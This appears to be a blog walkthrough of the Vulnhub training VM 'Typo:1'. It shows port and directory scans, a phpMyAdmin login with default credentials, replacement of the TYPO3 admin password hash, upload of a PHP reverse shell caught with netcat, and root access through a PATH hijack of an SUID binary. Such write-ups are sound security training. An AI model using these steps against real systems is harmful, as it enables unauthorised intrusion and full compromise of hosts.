---
date: 2020-06-21 00:00:42
layout: post
title: "Typo Vulnhub Walkthrough"
subtitle:
description: Typo:1 is another boot2root VM from Vulnhub. This machine is considered good for OSCP.
image: /assets/img/uploads/typo/typo.png
optimized_image: /assets/img/uploads/typo/typo-optimized.png
category: walkthrough
tags: vulnhub boot2root
author: madhavmehndiratta
paginate: false
keywords: typo1, typo vulnhub, typo vulnhub walkthrough, typo walkthrough, typo 1 vulnhub, infosec articles, typo vulnhub writeup
---

Typo:1 is another boot2root VM from Vulnhub. This machine is considered good for OSCP Preparation. I have added the machine to my hosts file, so Let's Begin!

```r
root@kali:~# cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
192.168.1.208   typo.local
```

## Initial Enumeration and Shell

I started the reconnaissance by running a port scan with Nmap, checking default scripts and testing for vulnerabilities.

```r
root@kali:~# nmap -sC -sV -oA nmap/typo typo.local
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-20 13:06 IST
Nmap scan report for typo.local (192.168.1.208)
Host is up (0.00051s latency).
Not shown: 995 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 cd:dc:8f:24:51:73:54:bc:87:62:a2:e6:ed:f1:c1:b4 (RSA)
|   256 a9:39:a9:bf:b2:f7:01:22:65:07:be:15:48:e8:ef:11 (ECDSA)
|_  256 77:f5:a9:ff:a6:44:7c:9c:34:41:f1:ec:73:5e:57:bd (ED25519)
80/tcp   open  http    Apache httpd 2.4.38 ((Debian))
|_http-generator: TYPO3 CMS
|_http-server-header: Apache/2.4.38 (Debian)
| http-title: Armour: Infosec
|_Requested resource was http://typo.local/en/
8000/tcp open  http    Apache httpd 2.4.38
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Did not follow redirect to http://typo.local
8080/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Site doesnt have a title (text/html).
8081/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Site doesnt have a title (text/html).
MAC Address: 08:00:27:BD:46:E3 (Oracle VirtualBox virtual NIC)
Service Info: Host: 127.0.0.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.71 seconds
```

We have Apache Web Servers running on four different ports. Next step was to run a Gobuster scan to look for hidden directories.
```r
root@kali:~# gobuster dir -u http://typo.local -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o port80.log  

===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://typo.local
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
Starting gobuster
===============================================================
/en (Status: 200)
/license (Status: 403)
/README (Status: 403)
/changelog (Status: 403)
/ChangeLog (Status: 403)
/vendor (Status: 403)
/fileadmin (Status: 301)
/readme (Status: 403)
/todo (Status: 403)
/typo3temp (Status: 301)
/TODO (Status: 403)
/typo3 (Status: 301)
/vendorsolutions (Status: 403)
===============================================================
Finished
===============================================================
```

I found <b>typo3</b> and <b>typo3temp</b> directories which suggests that this webserver is using <b>typo3 cms.</b> Then I performed the same scan on other ports and found a <b>phpmyadmin</b> directory on port 8081.
```r
root@kali:~# gobuster dir -u http://typo.local:8081 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o port8081.log
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://typo.local:8081
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/06/20 13:09:19 Starting gobuster
===============================================================
/phpmyadmin (Status: 301)
/server-status (Status: 403)
===============================================================
2020/06/20 13:12:05 Finished
===============================================================
```

<p align="justify"> First I went to the typo3 directory on port 80 and tried logging in with some default username and password but I wasn't successful. Then I went to the phpmyadmin directory on port 8081 and again tried some random username and passwords. This time I was able to login with username <b>root</b> and password <b>root.</b> </p>

<center><br>
<img src="/assets/img/uploads/typo/phpmyadmin.png">
</center>

Inside the phpmyadmin, I found a database named <b>TYPO3</b> inside which there was a table named <b>be_users</b> which contained two records.

<center><br>
<img src="/assets/img/uploads/typo/be-users.png">
</center>

These contain a password which is hashed using <b>argon2id</b> algorithm. I found a website named <a href="https://argon2.online/"> argon2.online </a> which can be used to generate such hashes. I went to this website and created my own hash.

<center><br>
<img src="/assets/img/uploads/typo/argon2-hash.png">
</center>

I replaced this hash with the admin's password in the be_users table. Now, I was able to login into the typo3-cms on port80 using username <b>admin</b> and password <b>madhav.</b>

<center><br>
<img src="/assets/img/uploads/typo/typo3-cms.png">
</center>

<p align="justify">
Then I went to the <b>Filelist Panel</b> to see if I can upload a php backdoor. Unfortunately, php uploads were disabled on this website. After some enumeration, I found an option named <b>fileDenyUpload</b> in <b>Settings > Configure Installation-Wide Options</b> which restricts certain extensions from being uploaded on the website. I cleared this option and saved the settings. </p>

<center><br>
<img src="/assets/img/uploads/typo/file-extensions.png">
</center>

This time, I was able to upload the backdoor. I used the php-reverse-shell from <a href="https://github.com/pentestmonkey/php-reverse-shell" rel=”nofollow”>pentest monkey.</a>

<center><br>
<img src="/assets/img/uploads/typo/shell-upload.png">
</center>

Then I started a netcat listener, and sent a request to the backdoor I uploaded using <b>curl</b> on another terminal and got a reverse shell from the target machine.

```r
root@kali:~# curl -v http://typo.local/fileadmin/shell.php
*   Trying 192.168.1.208:80...
* TCP_NODELAY set
* Connected to typo.local (192.168.1.208) port 80 (#0)
> GET /fileadmin/shell.php HTTP/1.1
> Host: typo.local
> User-Agent: curl/7.68.0
> Accept: */*
>
```

```r
root@kali:~# nc -lvnp 9001
listening on [any] 9001 ...
connect to [192.168.1.11] from (UNKNOWN) [192.168.1.208] 48354
Linux typo 4.19.0-8-amd64 #1 SMP Debian 4.19.98-1 (2020-01-26) x86_64 GNU/Linux
 13:28:24 up 23 min,  0 users,  load average: 11.49, 11.52, 8.82
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: cant access tty; job control turned off
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@typo:/$
```

## Privilege Escalation

Rooting this box was trivial. I searched for SUID files and found an unusual binary named <b>apache2-restart.</b>

```r
www-data@typo:/tmp$ find / -type f -perm -u=s 2>/dev/null
find / -type f -perm -u=s 2>/dev/null
/usr/bin/mount
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/su
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/umount
/usr/bin/passwd
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/local/bin/apache2-restart
/usr/local/bin/phpunit
```
As the name suggests, This binary <b>restarts the apache2 service.</b> I confirmed this by running <b>strings</b> command on the service.

<center><br>
<img src="/assets/img/uploads/typo/strings.png">
</center>

This is one of the most common privilege escalation method. All we need to do is create our own version of the service in the /tmp directory and add that path to the PATH variable. Then we can call apache2-restart, which will execute our malicious service with root privileges.

```r
www-data@typo:/tmp$ echo '/bin/bash' > service 
echo '/bin/bash' > service 
www-data@typo:/tmp$ chmod +x service
chmod +x service
www-data@typo:/tmp$ export PATH=/tmp/:$PATH
export PATH=/tmp/:$PATH
www-data@typo:/tmp$ apache2-restart
apache2-restart
root@typo:/tmp# id
id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
```
Hurray! This worked as expected and now we can read our root flag.

```r
root@typo:/tmp# cat /root/proof.txt
cat /root/proof.txt
Best of Luck
$2y$12$EUztpmoFH8LjEzUBVyNKw.9AKf37uZWPxJp.A3aap2ff0LbLYZrF
```
<p align="justify"> That’s it! Thanks for reading. Stay tuned for similar walkthroughs and much more coming up in the near future! If you have any queries, you can contact me <a href="/contact">here.</a> </p>

NOTE: The awesome artwork used in this article was created by <a href="https://dribbble.com/freebird" rel=”nofollow”>Alexandr Ivanov.</a>